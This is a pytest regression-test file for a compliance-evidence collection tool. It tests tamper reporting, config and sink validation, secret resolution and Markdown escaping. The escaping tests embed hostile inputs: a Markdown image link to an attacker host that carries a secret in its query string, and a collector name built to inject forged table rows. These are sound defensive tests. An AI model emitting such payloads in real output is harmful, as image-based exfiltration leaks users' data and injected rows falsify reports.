"""Regression tests for bugs the fuzz targets found. Each one failed before its fix."""

from __future__ import annotations

import json
from types import SimpleNamespace

import pytest

from grcevidence.collectors.base import Parameters
from grcevidence.models import Evidence, Finding, RunManifest, RunResult, Status
from grcevidence.report import _cell, load_run, report_markdown, verify_run
from grcevidence.runner import Config, ConfigError, build_sinks
from grcevidence.secrets import SecretError, resolve_secret
from grcevidence.sinks.base import SinkError
from grcevidence.sinks.http import HttpSink
from grcevidence.sinks.local import LocalSink


def _evidence(**kw) -> Evidence:
    base = dict(
        collector="aws.x",
        provider="aws",
        title="t",
        account="111111111111",
        region="us-east-1",
        collected_at="2026-01-01T00:00:00+00:00",
        status=Status.PASS,
        summary="ok",
    )
    return Evidence(**{**base, **kw}).seal()


def _run(tmp_path, evidence=None):
    evidence = evidence or [_evidence(), _evidence(collector="aws.y")]
    manifest = RunManifest(
        run_id="run1",
        started_at="2026-01-01T00:00:00+00:00",
        finished_at="2026-01-01T00:00:01+00:00",
        tool_version="t",
        accounts=["111111111111"],
        counts={},
        evidence=[
            {"id": e.id, "file": e.filename, "status": e.status.value, "sha256": e.sha256}
            for e in evidence
        ],
    ).seal()
    LocalSink(tmp_path).write(RunResult(manifest=manifest, evidence=evidence))
    return tmp_path / "run1"


# ------------------------------------------------- verify reports tampering, never crashes


def test_an_untouched_run_verifies(tmp_path):
    assert verify_run(_run(tmp_path)) == []


@pytest.mark.parametrize(
    "junk", [b"[]", b"null", b"42", b'"x"', b"{", b"{}", b"\xff\xfe", b'{"collector": 1}']
)
def test_a_damaged_evidence_file_is_reported_not_a_crash(tmp_path, junk):
    run = _run(tmp_path)
    victim = next(p for p in run.glob("*.json") if p.name != "manifest.json")
    victim.write_bytes(junk)
    problems = verify_run(run)
    assert problems and any(victim.name in p for p in problems)


@pytest.mark.parametrize("key", ["file", "sha256", "id", "status"])
def test_a_manifest_entry_missing_a_key_is_reported(tmp_path, key):
    run = _run(tmp_path)
    manifest = json.loads((run / "manifest.json").read_text(encoding="utf-8"))
    del manifest["evidence"][0][key]
    (run / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    assert verify_run(run)


@pytest.mark.parametrize("text", ["[]", "null", "{", "{}", '{"run_id": 1}', "42"])
def test_a_damaged_manifest_is_reported(tmp_path, text):
    run = _run(tmp_path)
    (run / "manifest.json").write_text(text, encoding="utf-8")
    problems = verify_run(run)
    assert problems and "manifest.json" in problems[0]


def test_a_manifest_entry_that_is_not_an_object_is_reported(tmp_path):
    run = _run(tmp_path)
    manifest = json.loads((run / "manifest.json").read_text(encoding="utf-8"))
    manifest["evidence"] = ["oops", 5, None]
    (run / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    assert verify_run(run)


def test_loading_a_damaged_run_raises_value_error(tmp_path):
    run = _run(tmp_path)
    next(p for p in run.glob("*.json") if p.name != "manifest.json").write_bytes(b"[]")
    with pytest.raises(ValueError, match="malformed"):
        load_run(run)


# ---------------------------------------------------------------- evidence hashing


def test_mixed_type_keys_no_longer_break_hashing_or_the_round_trip():
    ev = _evidence(data={1: "a", "b": 2, 10: [3], None: None, 2.5: {"x": 1}})
    text = json.dumps(ev.to_dict(), indent=2, sort_keys=True)  # what LocalSink writes
    assert Evidence.from_dict(json.loads(text)).verify()


def test_very_long_identifiers_still_give_a_bounded_unique_filename():
    a = _evidence(collector="c" * 400)
    b = _evidence(collector="c" * 399 + "d")
    assert len(a.filename) < 200 and a.filename.endswith(".json")
    assert a.filename != b.filename


# ------------------------------------------------------------------------- report


def test_cell_escapes_markdown_links_images_code_and_backslashes():
    hostile = "![x](https://attacker.example/p.png?d=secret) `code` \\ [y](z)"
    out = _cell(hostile)
    assert "[" not in out.replace("\\[", "") and "]" not in out.replace("\\]", "")
    assert "`" not in out.replace("\\`", "")


def test_cell_replaces_every_kind_of_line_break():
    for ch in ("\n", "\r", "\x0b", "\x0c", "\x1c", chr(0x85), chr(0x2028), chr(0x2029)):
        out = _cell(f"a{ch}b")
        assert len(out.splitlines()) == 1 and out == "a b"


def test_collector_names_from_disk_cannot_break_out_of_the_evidence_column():
    evil = _evidence(
        collector="x | forged | row\n| [c](https://attacker.example) |",
        status=Status.FAIL,
        controls={"soc2": ["CC6.1"]},
        findings=[Finding("r", "m")],
    )
    manifest = RunManifest("run", "t", "", "v", [], {}, [])
    good = _evidence(status=Status.FAIL, controls={"soc2": ["CC6.1"]}, findings=[Finding("r", "m")])
    assert len(report_markdown(manifest, [evil], "soc2").splitlines()) == len(
        report_markdown(manifest, [good], "soc2").splitlines()
    )


# --------------------------------------------------------------------- config loading


@pytest.mark.parametrize(
    "raw",
    [
        {"regions": 5},
        {"regions": [1]},
        {"accounts": 5},
        {"accounts": ["x"]},
        {"accounts": [{"id": 111}]},
        {"accounts": [{"regions": "us-east-1"}]},
        {"collectors": ["a"]},
        {"collectors": {"include": 3}},
        {"gcp": 5},
        {"gcp": {"projects": 5}},
        {"sinks": 5},
        {"sinks": ["local"]},
        {"parameters": [1]},
        {"parameters": {"max_access_key_age_days": "90"}},
        {"parameters": {"max_access_key_age_days": -1}},
        {"parameters": {"max_access_key_age_days": True}},
        {"parameters": {"require_securityhub": "false"}},
        {"parameters": {"sensitive_ports": 22}},
        {"parameters": {"sensitive_ports": [0]}},
        {"parameters": {"sensitive_ports": [70000]}},
        {"parameters": {"sensitive_ports": [True]}},
        {"parameters": {"sensitive_ports": ["x"]}},
    ],
)
def test_wrongly_typed_config_raises_config_error_not_a_crash(raw):
    with pytest.raises(ConfigError):
        Config.from_dict(raw)


def test_well_typed_config_and_string_ports_still_load():
    cfg = Config.from_dict(
        {"parameters": {"sensitive_ports": ["22", 3389], "max_access_key_age_days": 30}}
    )
    assert cfg.parameters.sensitive_ports == (22, 3389)
    assert Parameters.from_dict(None).max_access_key_age_days == 90


# -------------------------------------------------------------------------- sinks


def test_a_quoted_false_no_longer_enables_plain_http():
    """allow_insecure_http: "false" is a truthy string; it used to permit an http:// URL."""
    with pytest.raises(SinkError, match="allow_insecure_http must be true or false"):
        HttpSink("http://localhost/x", allow_insecure_http="false")  # type: ignore[arg-type]
    HttpSink("http://localhost/x", allow_insecure_http=True)  # a real opt-in still works
    with pytest.raises(SinkError, match="https"):
        HttpSink("http://localhost/x")


@pytest.mark.parametrize(
    "url",
    ["https://[::1/x", "https://user@ingest.example.com/", "https://@ingest.example.com/", 5],
)
def test_bad_sink_urls_raise_sink_error(url):
    with pytest.raises(SinkError):
        HttpSink(url)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "extra",
    [
        {"headers": ["a", "b"]},
        {"headers": {"a": 1}},
        {"auth": ["bearer"]},
        {"payload_template": "x"},
        {"timeout": "30"},
        {"timeout": True},
        {"retries": -1},
        {"retries": 1.5},
        {"dry_run": "yes"},
    ],
)
def test_wrongly_typed_http_options_raise_config_error(extra):
    with pytest.raises(ConfigError):
        build_sinks([{"type": "http", "url": "https://ingest.example.com/", **extra}])


def test_a_malformed_sink_spec_raises_config_error():
    for spec in ("local", 5, None, ["type", "local"]):
        with pytest.raises(ConfigError):
            build_sinks([spec])  # type: ignore[list-item]


# ------------------------------------------------------------------------ secrets


class _Aws:
    def __init__(self, **responses):
        self._responses = responses

    def client(self, name):
        responses = self._responses
        return SimpleNamespace(
            get_parameter=lambda **kw: responses["ssm"],
            get_secret_value=lambda **kw: responses["secretsmanager"],
        )


@pytest.mark.parametrize(
    ("ref", "response"),
    [
        ("ssm:/p", {"ssm": {"Parameter": {"Value": ""}}}),
        ("ssm:/p", {"ssm": {"Parameter": {"Value": None}}}),
        ("secretsmanager:s", {"secretsmanager": {"SecretString": ""}}),
        ("secretsmanager:s", {"secretsmanager": {"SecretBinary": b"x"}}),
        ("secretsmanager:s#k", {"secretsmanager": {"SecretString": '{"k": null}'}}),
        ("secretsmanager:s#k", {"secretsmanager": {"SecretString": '{"k": ""}'}}),
        ("secretsmanager:s#k", {"secretsmanager": {"SecretString": '{"k": [1]}'}}),
        ("secretsmanager:s#k", {"secretsmanager": {"SecretString": '{"k": true}'}}),
        ("secretsmanager:s#k", {"secretsmanager": {"SecretString": "[1, 2]"}}),
        ("secretsmanager:s#k", {"secretsmanager": {"SecretString": "not json"}}),
    ],
)
def test_empty_or_non_string_secrets_are_rejected_not_stringified(ref, response):
    with pytest.raises(SecretError):
        resolve_secret(ref, session=_Aws(**response))


def test_valid_secrets_still_resolve():
    aws = _Aws(
        ssm={"Parameter": {"Value": "s3cr3t"}},
        secretsmanager={"SecretString": '{"token": "abc", "pin": 12345}'},
    )
    assert resolve_secret("ssm:/p", session=aws) == "s3cr3t"
    assert resolve_secret("secretsmanager:s#token", session=aws) == "abc"
    assert resolve_secret("secretsmanager:s#pin", session=aws) == "12345"  # numeric is legitimate


def test_an_environment_variable_name_with_a_nul_is_a_secret_error():
    with pytest.raises(SecretError):
        resolve_secret("env:A\x00B")
